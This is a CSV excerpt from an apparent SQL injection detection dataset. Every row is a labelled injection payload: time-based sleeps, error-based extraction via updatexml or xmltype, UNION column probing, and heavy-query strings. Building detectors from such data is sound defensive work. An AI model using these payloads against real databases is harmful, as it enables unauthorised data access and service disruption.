row_index,payload_norm,label,sqli_type_hint
3990,1' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
3991,"1' ) union all select null,null,null,null,null,null,null--",1,
3992,"1%"" waitfor delay '0:0:5' and ""%"" = """,1,
3993,1' ) ) and 4242 = 5831 and ( ( 'xflh' like 'xflh,1,
3994,"-5278"" ) ) ) union all select 5264,5264,5264#",1,
3995,-3462' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'cxku' like 'cxku,1,
3996,1'|| ( select 'boib' where 9595 = 9595,1,
3997,"1%' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
3998,"-4934"" union all select 5119,5119,5119,5119,5119--",1,
3999,"1%' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( '%' = '",1,
4000,"1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
4001,"1'|| ( select 'vixv' from dual where 7704 = 7704 union all select null,null,null,null,null--",1,
4002,"1%"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,1,
4003,"1'|| ( select 'fbsr' where 7899 = 7899 and elt ( 4249 = 4249,7259 ) ) ||'",1,
4004,"1' ) where 6056 = 6056 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,
4005,"iif ( 4638 = 8258,1,1/0 )",1,
4006,"-3873%' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
4007,"1' ) as nvqk where 3917 = 3917 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4008,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'acml' like 'acml,1,
4009,"1' ) ) ) union all select null,null,null,null--",1,
4010,"1"" ) as rdvm where 6360 = 6360 and sleep ( 5 ) --",1,
4011,"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""onhh"" = ""onhh",1,
4012,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'blie' = 'blie",1,
4013,"1"" where 7245 = 7245 and 9198 = 9198--",1,
4014,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'yqmv' = 'yqmv",1,
4015,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
4016,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",1,
4017,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'pbin' = 'pbin",1,
4018,"1"" ) ) ) and 4124 = 7245 and ( ( ( ""tuom"" = ""tuom",1,
4019,1' ) as irnj where 7274 = 7274 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,
